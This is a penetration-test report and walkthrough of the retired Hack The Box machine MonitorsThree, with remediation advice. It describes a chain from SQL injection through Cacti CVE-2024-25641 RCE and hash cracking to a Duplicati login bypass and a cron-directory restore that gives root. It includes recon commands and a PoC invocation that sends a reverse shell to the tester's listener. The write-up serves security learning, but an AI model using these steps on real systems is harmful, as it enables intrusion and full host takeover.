# HTB MonitorsThree — Penetration Testing Report

**Author:** matw0
**Assessment dates:** 12–13 October 2026  
**Environment:** Hack The Box — MonitorsThree (retired, Medium, Linux)  
**Report type:** Educational penetration-test assessment and technical walkthrough  
**Focus:** Web application exploitation, authenticated RCE, credential exposure, post-exploitation and Linux privilege escalation  
**Status:** Lab completed; reporting based on captured notes and evidence

---
## 1. Executive summary

An assessment of the retired MonitorsThree Linux machine identified a chain of vulnerabilities that allowed an unauthenticated user to progress from a public-facing password-recovery form to full administrative access on the host.

Initial enumeration identified two web applications: the main `monitorsthree.htb` site and a `cacti.monitorsthree.htb` virtual host. The password-recovery functionality on the main site was vulnerable to SQL injection. Manual testing exposed database information, including an administrator's password hash. The recovered credentials provided access to a Cacti 1.2.26 instance affected by **CVE-2024-25641**, an authenticated package-import vulnerability that permits arbitrary file writing and remote PHP code execution. Exploitation produced a shell as the `www-data` account.

Further enumeration revealed database credentials in the Cacti configuration and a second user account, `marcus`. Recovery of that account's password enabled local user access. The final stage involved a locally accessible Duplicati backup service. Its server passphrase was obtainable from the service's local SQLite configuration, allowing the web login to be bypassed. The backup service could then restore files into privileged host locations; the submitted evidence records a restore into the system cron directory followed by a shell running as `root`.

The central issue was **the combined effect of weak input handling, exposed credentials and excessive trust in privileged application components**. No single discovery explains the whole compromise; each step provided the permissions or information needed for the next.

**Overall outcome:** Full host compromise demonstrated in the HTB environment. The most urgent remediation areas would be the public-facing SQL injection, unpatched Cacti instance and privileged backup service.

## 2. Scope and limitations

| Item | Details |
|---|---|
| Target | MonitorsThree — HTB retired machine |
| Hostnames | `monitorsthree.htb`, `cacti.monitorsthree.htb` |
| Primary target observed | `10.129.231.115` |
| Later SSH target observed | `10.129.85.85` |
| Operating system | Ubuntu Linux (observed via service enumeration and shell output) |
| Initial externally observed ports | `22/tcp` SSH, `80/tcp` HTTP; `8084/tcp` filtered in the initial scan |
| Post-exploitation interface | Duplicati listening on `127.0.0.1:8200` |
| Tools used | Nmap, ffuf, Burp Suite, Hashcat, Cacti exploit PoC, Netcat, SSH port forwarding, SQLite inspection |
| Assessment approach | Black-box enumeration and manual exploitation, followed by authenticated host enumeration |

The IP address differs between the initial assessment and a later SSH session. A reset/redeployment would be a plausible explanation, but it is **not confirmed in the captured notes**. The IP change does not itself establish a separate target. Only recorded activities have been represented as performed.

**Evidence limitations:** Two screenshot references in the original Obsidian draft were absent from the supplied ZIP (`Pasted image 20261012195635.png`, `Pasted image 20261012195806.png`). Their results are therefore described only where supported by the written terminal output. The exact successful error-based SQL injection requests were not preserved as full HTTP request captures. The complete Duplicati restoration sequence has screenshots of configuration and an observed root shell, but no screenshot of every intermediate confirmation dialog.

## 3. Summary of findings

| ID | Finding | Affected area | Severity | CVSS v3.1 | Classification |
|---|---|---|---|---|---|
| F01 | SQL injection in password recovery | `POST /forgot_password.php` — `username` | **High** | **7.5** | CWE-89 |
| F02 | Authenticated arbitrary file write leading to RCE | Cacti 1.2.26 package import | **Critical** | **9.1** | CVE-2024-25641, CWE-434 / CWE-73 |
| F03 | Authentication bypass using exposed Duplicati server passphrase | Duplicati login on port 8200 | **High** | **7.8*** | CWE-287, CWE-522 |
| F04 | Privileged backup restoration allows host-level code execution | Duplicati backup/restore and host filesystem | **High** | **7.8*** | CWE-250, CWE-732 |

*F03/F04 are analyst-assigned, environment-specific CVSS estimates rather than vendor scores; the vectors and assumptions are documented below. Scores reflect the vulnerabilities individually, **not an additive numerical score for the full attack chain**.*

**Related observations:** The password-recovery form returned different messages for different usernames; the recovered admin password hash was compatible with MD5 and cracked using a common wordlist; and account credentials worked across application boundaries. These issues increased the impact of F01 but are not treated as separate independently verified exploits in this report.

---

# 4. Technical walkthrough and evidence

## 4.1 Network enumeration and application discovery

The assessment began with service enumeration:

```bash
nmap -sV -sC -T5 -oA test 10.129.231.115
```

The scan identified OpenSSH on port 22 and nginx on port 80. Port 8084 was reported as filtered. The HTTP service redirected to `http://monitorsthree.htb/`, so the hostname was mapped locally in `/etc/hosts` to access the correct virtual host.

![Initial MonitorsThree web application](./evidence/Pasted%20image%2020261012192829.png)
*Evidence E01 — Landing page reached after resolving the `monitorsthree.htb` hostname.*

A quick review of the site's source and its linked resources suggested a PHP-backed application, with a `login.php` and password-recovery flow. Nothing immediately useful was discovered in the page source alone, so I moved to virtual-host enumeration:

```bash
ffuf -u http://monitorsthree.htb \
  -H 'Host: FUZZ.monitorsthree.htb' \
  -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

The response for **`cacti.monitorsthree.htb`** stood out with status `302`. This identified a second application and became relevant later in the exploitation chain.

## 4.2 Password recovery: username enumeration and SQL injection

At `forgot_password.php`, I submitted different usernames to check whether the response changed. The page returned a success message for `admin`, while a test username returned an error.

![Password recovery form](./evidence/Pasted%20image%2020261012195106.png)
*Evidence E02 — Login interface and link to password recovery.*

![Password reset request for the admin account](./evidence/Pasted%20image%2020261012195158.png)
*Evidence E03 — Successful response shown for the `admin` username.*

![Different password recovery response for a test username](./evidence/Pasted%20image%2020261012195309.png)
*Evidence E04 — Different response for a username not accepted by the application.*

The difference between these messages created a **username enumeration side channel**. I then tested the `username` parameter for SQL injection. A modified value was accepted by the application, which was an initial indication of an injectable query rather than proof on its own.

![Initial injection test on password recovery](./evidence/Pasted%20image%2020261012195505.png)
*Evidence E05 — An early SQL injection probe submitted to the password-reset form.*

I moved the request to **Burp Suite Repeater** for more controlled testing. The server responded with `302 Found`, redirecting back to the form; following the redirect was necessary to inspect the application's final message. Repeater made it easier to compare responses and test how the SQL query behaved.

![Repeater request and redirect](./evidence/Pasted%20image%2020261012200152.png)
*Evidence E06 — Burp Repeater showing a modified `username` parameter and an HTTP 302 response.*

![Followed redirect and password-reset response](./evidence/Pasted%20image%2020261012200709.png)
*Evidence E07 — Repeater after following the redirect, showing the rendered success feedback.*

An `ORDER BY` sequence was used to estimate the number of columns referenced by the query. The notes record that index **9** was accepted and index **10** produced the error:

```text
SQLSTATE[42S22]: Column not found:
1054 Unknown column '10' in 'order clause'
```

The next stage used **error-based SQL injection** with `EXTRACTVALUE()` to return database metadata. The notes record the database name `monitorsthree_db`, the `users` table, and account fields including `username` and `password`. Usernames recovered included `admin` and `dthompson`.

**Evidence quality note:** The handwritten `EXTRACTVALUE()` examples in the original notes contain some syntax errors and are not an exact reproducible transcript. I have deliberately not presented repaired queries as commands that were definitely executed. The returned database names and account information are recorded in the supplied notes; their exact raw requests should be recovered from Burp history if this report is to serve as a fully reproducible client PoC.

The administrator password hash appeared to be a 32-character MD5 digest. It was tested offline using Hashcat's MD5 mode (`-m 0`) and the `rockyou.txt` wordlist. The password was recovered, providing credentials for the Cacti application discovered earlier. The actual hash and plaintext password are withheld from the public report text.

**Why this mattered:** The SQL injection allowed access to data that the password-reset function was never intended to return. The subsequent account compromise depended on the recovered password being guessable and reusable, rather than on the SQL injection directly authenticating as the administrator.

## 4.3 Cacti 1.2.26: authenticated remote code execution

The `cacti.monitorsthree.htb` virtual host exposed the Cacti monitoring platform. Directory enumeration returned `/cacti`, and its login page showed **version 1.2.26**.

![Cacti login page displaying version 1.2.26](./evidence/Pasted%20image%2020261013174840.png)
*Evidence E08 — Cacti application version visible on the login page.*

Cacti 1.2.26 is affected by **CVE-2024-25641**, an authenticated arbitrary file-write vulnerability in package import. An account with the **Import Templates** permission can upload a crafted package that causes attacker-controlled PHP files to be written to a web-accessible location. Executing the uploaded file can produce remote code execution.

The notes show the use of a published Python proof-of-concept script. The command below keeps the lab target and listener details while redacting the account password:

```bash
python3 exploitcacti.py \
  --url http://cacti.monitorsthree.htb/cacti \
  --user admin \
  --password '[REDACTED]' \
  --lhost 10.10.15.197 \
  --lport 4443
```

The script reported successful authentication, upload of a generated compressed package, validation and triggering of the resulting PHP file under `/cacti/resource/`. A Netcat listener received a connection from the target, and the shell reported:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms **server-side code execution as the web-service account**, not root privileges at this stage.

### Post-exploitation: recovering local user access

With the `www-data` shell, I checked `/etc/passwd`, which listed a local user named `marcus`. I also examined `/var/www/html/cacti/include/config.php`, which was readable by the web-service account and contained the Cacti database connection details.

Using the database credentials from that configuration, the notes record a successful MariaDB connection and a query against Cacti's `user_auth` table. That table held bcrypt hashes, including one for `marcus`.

The `marcus` hash was tested with Hashcat's bcrypt mode (`-m 3200`) and a wordlist. The notes record a recovered password and successful transition to a `marcus` shell; the plaintext credential and the `user.txt` flag are omitted here. Unlike the earlier MD5 example, **bcrypt itself should not be described as broken**: the observed weakness was that this particular account password was guessable and could be reused.

**Outcome of this stage:** Access progressed from the public HTTP service to `www-data`, then to an authenticated local user. Root privileges had not yet been obtained.

## 4.4 Local enumeration identifies Duplicati

Further enumeration was performed from the `marcus` account. The notes record use of process inspection, mount configuration inspection and socket enumeration (`ss -lntp`). Of particular interest was a service bound to **`127.0.0.1:8200`**.

The host contained `/opt/duplicati`, associated configuration files, and backup archives under `/opt/backups/cacti/`. A cron entry for Duplicati was also found under `/etc/cron.d/duplicati`. The service was not available directly over the target's public HTTP interface, so it was accessed through an SSH local port forward:

```bash
ssh -L 8200:127.0.0.1:8200 marcus@10.129.85.85 -i marcus.pem
```

The SSH private key is referenced in the original command, but the preceding notes do not document how that key was obtained or created. The successful connection and forwarded Duplicati interface are recorded; the key acquisition step should not be inferred.

The Duplicati UI was then accessible through `http://127.0.0.1:8200` on the testing machine. Its local SQLite configuration was examined to understand how the login password was handled.

![Inspecting Duplicati SQLite configuration](./evidence/Pasted%20image%2020261013194544.png)
*Evidence E09 — Investigation of the Duplicati configuration database and associated local files.*

## 4.5 Duplicati authentication bypass

The original notes reference Duplicati GitHub issue **#5197**, which describes a weakness in older Duplicati authentication flows: access to the stored server passphrase can be enough to construct an accepted login response without knowing the UI password.

I compared the salt visible in Duplicati's authentication exchange with the corresponding value stored in its SQLite configuration. The captured HTTP response includes a fresh nonce and the server salt, while the local database records the server passphrase.

![Duplicati nonce, salt and local configuration values](./evidence/Pasted%20image%2020261013205520.png)
*Evidence E10 — Burp response alongside Duplicati database values. The screenshot contains authentication material and should be sanitised before public publication.*

The notes then record converting the base64 server passphrase to hexadecimal and using the value in the authentication flow described by issue #5197. Subsequent screenshots show an authenticated session and the Duplicati dashboard. The exact generated authentication value is not reproduced in this report.

![Authenticated Duplicati session request](./evidence/Pasted%20image%2020261013210920.png)
*Evidence E11 — Authenticated request including session cookies. These cookies must be redacted before public publication.*

![Duplicati dashboard](./evidence/Pasted%20image%2020261013210943.png)
*Evidence E12 — Access to the Duplicati dashboard after bypassing the normal password prompt.*

**Important distinction:** This bypass alone does not imply that every installation of Duplicati is vulnerable or that the backup software is intrinsically a root exploit. The critical combination on this lab host was **read access to the server configuration, a compatible authentication flow and backup permissions broad enough to affect protected host files**.

## 4.6 Privilege escalation through backup and restore permissions

After Duplicati access was established, the backup and restore features exposed a further trust-boundary issue. The screenshots show the creation of a cron-style file under the `marcus` home directory and the configuration of a Duplicati backup job, followed by a restoration to the host's cron directory.

![Creating the file later used in the restore workflow](./evidence/Pasted%20image%2020261013211159.png)
*Evidence E13 — Local terminal and listener during preparation of a cron-style file.*

![Duplicati backup destination selection](./evidence/Pasted%20image%2020261013211338.png)
*Evidence E14 — Duplicati backup configuration showing the filesystem destination selection.*

![Duplicati source-data selection](./evidence/Pasted%20image%2020261013211506.png)
*Evidence E15 — Source data selection within the Duplicati backup job.*

![Duplicati backup job status](./evidence/Pasted%20image%2020261013211653.png)
*Evidence E16 — The backup job displayed in Duplicati.*

![Duplicati restore configured to use host cron directory](./evidence/Pasted%20image%2020261013211802.png)
*Evidence E17 — Restore destination set to `/source/etc/cron.d` with overwrite selected.*

The restore path shown is significant because **`/source/etc/cron.d` represents a privileged system scheduling location within the exposed host filesystem**. Permitting a lower-privileged user to restore arbitrary content there crosses the boundary between ordinary backup administration and host system administration.

The supplied terminal output subsequently records a reverse connection whose prompt was:

```text
root@monitorsthree:~#
```

and access to a root-only flag. The flag value is not included. This supports the reported final outcome of a root shell. The screenshots establish the selected restore destination and the notes establish the subsequent shell; however, a full client-style reproduction should additionally capture the restoration-success result and a harmless `id`/`whoami` check at the root prompt.

**Root cause:** A service accessible to an ordinary local user was able to perform a backup restoration with permissions affecting privileged operating-system paths. The authentication weakness enabled control of that service; the excessive filesystem privileges enabled the final escalation.

---

# 5. Formal vulnerability findings

## F01 — SQL injection in password-recovery functionality

| Field | Assessment |
|---|---|
| **Severity** | **High — 7.5 (analyst-assigned)** |
| **CVSS v3.1** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — SQL Injection |
| **CVE** | N/A — no specific identifier established for this custom application |
| **Affected asset** | `http://monitorsthree.htb` |
| **Endpoint and parameter** | `POST /forgot_password.php`, `username` |
| **Authentication required** | No |
| **Evidence** | E03–E07 and recorded database query/output notes |

### Description

The password-recovery form incorporated attacker-supplied username input into a database query without adequate neutralisation. Manual parameter manipulation produced database errors and allowed error-based extraction of database metadata and user credential hashes. The interface also returned different messages for submitted usernames, which assisted account discovery.

### Proof of concept / reproduction summary

1. Submit an ordinary username to the password-recovery function and observe the result.
2. Repeat with a nonexistent username; compare the different responses.
3. Intercept `POST /forgot_password.php` in Burp Suite and test the `username` parameter using manual SQL syntax probes.
4. Follow the application's HTTP 302 response back to the password-recovery page to inspect the displayed result.
5. The recorded `ORDER BY` tests indicated nine selectable positions; the tenth produced an SQL error.
6. Error-based database extraction returned the `monitorsthree_db` database, the `users` table and stored account data.

The exact successful extraction requests were **not fully preserved** in the source archive and should be added from Burp history for complete reproducibility.

### Impact

An unauthenticated attacker could obtain database information and sensitive account records, including password hashes. Password cracking and credential reuse may then permit unauthorised access to other applications that trust the same credentials, as happened in this laboratory chain.

### Root-cause remediation

- Replace SQL-string concatenation with correctly parameterised prepared statements for all user-controlled values.
- Restrict the database account used by the recovery function to the minimum permissions necessary.
- Return the same generic response for existing and nonexistent usernames, while avoiding raw SQL errors in HTTP responses.
- Use a secure, single-use password-reset token workflow with expiration and rate limiting.
- Protect stored passwords with a purpose-built adaptive password hashing scheme such as Argon2id or bcrypt, and prevent cross-service credential reuse.

### Fix verification

Repeat the original benign and malicious input tests. They should produce no SQL errors, no unauthorised query output and no distinguishable account-existence response.

## F02 — Authenticated arbitrary file write and RCE in Cacti (CVE-2024-25641)

| Field | Assessment |
|---|---|
| **Severity** | **Critical — 9.1 (vendor advisory)** |
| **CVSS v3.1** | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| **CWE** | [CWE-434](https://cwe.mitre.org/data/definitions/434.html) — Unrestricted Upload of File with Dangerous Type; related [CWE-73](https://cwe.mitre.org/data/definitions/73.html) — External Control of File Name or Path |
| **CVE** | [CVE-2024-25641](https://www.cve.org/CVERecord?id=CVE-2024-25641) |
| **Affected component** | Cacti 1.2.26, authenticated package import |
| **Authentication required** | Yes — account with `Import Templates` permission |
| **Evidence** | E08, exploit script output and `www-data` reverse-shell output |

### Description

The installed Cacti instance exposed a package-import flaw that permitted an appropriately privileged authenticated account to write arbitrary file content to the server. The vulnerable `import_package()` implementation trusted filenames and data from an imported package. This permitted a crafted package to create a PHP file under a web-accessible path and execute it through an HTTP request.

The vendor's advisory identifies **version 1.2.27** as the patched release. The lab version displayed **1.2.26**.

### Proof of concept / reproduction summary

1. Identify the Cacti application and confirm the displayed version.
2. Authenticate using the recovered administrator credentials.
3. Use the recorded third-party proof-of-concept script against the authorised lab instance.
4. Observe confirmation of successful package upload and execution of a PHP resource.
5. Verify a reverse shell running as `www-data`, rather than assuming administrative host privileges.

### Impact

An attacker who obtains a suitable Cacti account could execute PHP code in the context of the web-server process, read application-accessible configuration, interfere with application data and perform additional local attacks. In the recorded chain, this access exposed the Cacti database and enabled a later pivot to `marcus`.

### Root-cause remediation

- Upgrade Cacti to a vendor-supported release containing the CVE-2024-25641 fix (**at least 1.2.27** for this issue).
- Restrict `Import Templates` permissions to necessary administrative accounts.
- Ensure import logic validates package contents and file destinations; reject path traversal and executable file writes outside explicitly approved directories.
- Prevent web-service accounts from writing executable code into directories served by the web server.
- Rotate credentials exposed by the compromise and review uploaded packages and web-access logs.

### Fix verification

Confirm the installed version is fixed, review package-import permissions and verify that importing test package data cannot create a server-executable file at an arbitrary destination.

**References:** [Cacti security advisory GHSA-7cmj-g5qc-pj88](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) · [CVE record](https://www.cve.org/CVERecord?id=CVE-2024-25641)

## F03 — Duplicati authentication bypass using locally exposed server passphrase

| Field | Assessment |
|---|---|
| **Severity** | **High — 7.8 (context-specific estimate)** |
| **CVSS v3.1** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | [CWE-287](https://cwe.mitre.org/data/definitions/287.html) — Improper Authentication; [CWE-522](https://cwe.mitre.org/data/definitions/522.html) — Insufficiently Protected Credentials |
| **CVE** | No CVE confirmed for the issue used in this report; vendor issue **#5197** |
| **Affected component** | Duplicati local web login, `127.0.0.1:8200` |
| **Prerequisite** | Local read access to the Duplicati server configuration database and access to the interface |
| **Evidence** | E09–E12 |

### Description

The Duplicati authentication flow used a server passphrase recorded in its local SQLite database. Where a lower-privileged user could obtain this stored value, it could be used to satisfy the application's login challenge without knowledge of the intended web-interface password.

The attacker needed local access to the relevant configuration information; this was **not** an unauthenticated, internet-facing login bypass. The captured version number of Duplicati itself was not sufficient to independently establish its precise patch level, so the report attributes the mechanism to vendor issue #5197 without inventing a vulnerable version or CVE.

### Proof of concept / reproduction summary

1. From the `marcus` session, identify Duplicati on localhost port 8200 and inspect its local configuration directory.
2. Establish an SSH local port forward to the service.
3. Read the locally accessible Duplicati SQLite configuration and identify the stored server passphrase/salt.
4. Compare the server salt with the application's login challenge as recorded in Burp Suite.
5. Follow the server-passphrase authentication workflow described in issue #5197.
6. Observe an authenticated Duplicati dashboard without submitting the ordinary UI password.

### Impact

A local user able to read Duplicati's server passphrase could take over its administrative UI. Depending on the privileges granted to the backup service, this can enable access to backup data, modification of jobs and unauthorised backup or restore operations.

### Root-cause remediation

- Upgrade to a maintained Duplicati release that addresses the legacy authentication design described in issue #5197.
- Restrict read access to the local SQLite server configuration to the dedicated Duplicati service identity.
- Treat server passphrases, authentication tokens and configuration backups as secrets; avoid storing unencrypted copies where ordinary users can retrieve them.
- Limit administrative access to the service to appropriate operating-system accounts and use independent controls for sensitive backup operations.
- Verify the current authentication implementation rather than assuming a particular CVE or version from interface appearance.

### Fix verification

As a non-privileged local user, confirm that the configuration database is unreadable; also verify that possession of a stale stored passphrase does not grant administrative access to the Duplicati interface.

**Reference:** [Duplicati GitHub issue #5197](https://github.com/duplicati/duplicati/issues/5197)

## F04 — Privileged backup restoration permits root-level system changes

| Field | Assessment |
|---|---|
| **Severity** | **High — 7.8 (context-specific estimate)** |
| **CVSS v3.1** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | [CWE-250](https://cwe.mitre.org/data/definitions/250.html) — Execution with Unnecessary Privileges; related [CWE-732](https://cwe.mitre.org/data/definitions/732.html) — Incorrect Permission Assignment for Critical Resource |
| **CVE** | N/A — insecure deployment/privilege configuration; no specific CVE established |
| **Affected component** | Duplicati backup/restore service and access to host filesystem |
| **Security boundary** | Local user / backup UI → protected host files and root-owned scheduled tasks |
| **Evidence** | E13–E17 and final root shell output |

### Description

The Duplicati backup service exposed restore operations that could target privileged host filesystem paths. The captured workflow showed a restore destination under `/source/etc/cron.d`, a location corresponding to the system's root-managed cron configuration. Backup administrators should not automatically have the ability to alter operating-system startup or scheduling files, particularly when the backup application operates with root-equivalent filesystem permissions.

The ability to restore attacker-controlled content into the host cron directory crossed the privilege boundary from a local account to the host's privileged execution context.

### Proof of concept / reproduction summary

1. Obtain access to Duplicati through the condition described in F03.
2. Create a controlled test file within the user-accessible home directory and include it in a backup job.
3. Run the backup and select a subsequent restore.
4. Configure the restore to a protected host directory as shown in E17 (`/source/etc/cron.d`, overwrite option selected).
5. The source notes record a later connection displaying a root shell prompt and access to a root-only file.

This establishes the attack outcome within the lab. For a fully reproducible assessment, add a screenshot confirming successful restore and a non-sensitive `id` check in the resulting root context. The report **does not assume** that any unspecified intermediate step occurred.

### Impact

A user who gains control of the backup interface could create or overwrite root-owned system files. In this lab, that control was sufficient to obtain root-level execution. In a production deployment, equivalent access could lead to full host takeover, service disruption, modification of security controls or compromise of sensitive backups.

### Root-cause remediation

- Run backup processing under a dedicated least-privileged identity instead of giving the service unrestricted root-equivalent access.
- Remove broad write access to host filesystem locations such as `/etc`, `/root`, systemd service definitions and cron directories unless strictly required for a controlled recovery operation.
- Restrict the source and destination paths that backup operators may select, including within container bind mounts.
- Require independent approval or privileged OS authentication before restoring to system-sensitive paths.
- Separate backup administration from operating-system administration, and audit restore actions and destination paths.

### Fix verification

Using an ordinary backup-operator session, attempt a harmless test restore to a location that should be reserved for root. The restore must be blocked by effective operating-system permissions, not merely by hiding the path in the UI.

---

## 6. Attack-chain summary

```text
Unauthenticated HTTP access
  → Password-recovery form: SQL injection (F01)
  → Administrator password hash recovered and cracked
  → Credentials reused on Cacti 1.2.26
  → Cacti package-import RCE: CVE-2024-25641 (F02)
  → Shell as www-data
  → Cacti database credentials and marcus hash recovered
  → marcus password recovered; local user access
  → Local Duplicati service on 127.0.0.1:8200
  → Server-passphrase authentication bypass (F03)
  → Privileged backup/restore path (F04)
  → Root shell observed
```

The chain illustrates why the security severity of the **overall compromise** cannot be understood from one vulnerability alone. The first issue provided the necessary credentials, the Cacti flaw provided code execution, and the backup service allowed a local foothold to affect system-level files.

## 7. Remediation priorities

| Priority | Action | Relevant findings |
|---|---|---|
| Immediate | Prevent SQL injection and credential extraction from password recovery | F01 |
| Immediate | Upgrade Cacti and restrict template import permissions | F02 |
| Immediate | Remove Duplicati's ability to restore files into root-sensitive host paths | F04 |
| High | Upgrade and secure Duplicati authentication and configuration-file permissions | F03 |
| High | Rotate compromised credentials and prevent reuse between applications | F01, F02 |
| High | Audit password-storage schemes and migrate fast hashes such as MD5 to adaptive password hashing | Supporting observation |
| High | Introduce monitoring for unusual password-reset traffic, Cacti package imports and privileged backup restores | All findings |

## 8. Conclusion

The MonitorsThree machine demonstrated an attack path beginning with a public web vulnerability and ending in a root shell. The initial SQL injection enabled credential recovery, the unpatched Cacti instance exposed authenticated remote code execution, and the Duplicati configuration allowed an ordinary local account to reach a privileged backup workflow.

The most valuable lesson from this assessment is the importance of **understanding how vulnerabilities connect**. Discovering a password hash, local-only web interface or writable configuration is not automatically a critical finding in isolation. Its significance becomes clearer once the associated privileges, accessible data and trust relationships are established.

From a reporting perspective, the assessment also reinforced the need to capture the exact HTTP requests, responses, authentication level, execution context and restoration outcomes as testing progresses. These details are what make a penetration-test report reproducible and useful for remediation—not just a successful walkthrough.

---

## 9. References

- [Hack The Box — MonitorsThree machine synopsis](https://www.hackthebox.com/machines/monitorsthree)
- [Cacti — GHSA-7cmj-g5qc-pj88, package import RCE](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88)
- [CVE-2024-25641 — CVE Record](https://www.cve.org/CVERecord?id=CVE-2024-25641)
- [Duplicati — Authentication bypass using DB server passphrase, issue #5197](https://github.com/duplicati/duplicati/issues/5197)
- [FIRST — CVSS v3.1 Specification](https://www.first.org/cvss/v3-1/specification-document)
- [MITRE — Common Weakness Enumeration](https://cwe.mitre.org/)
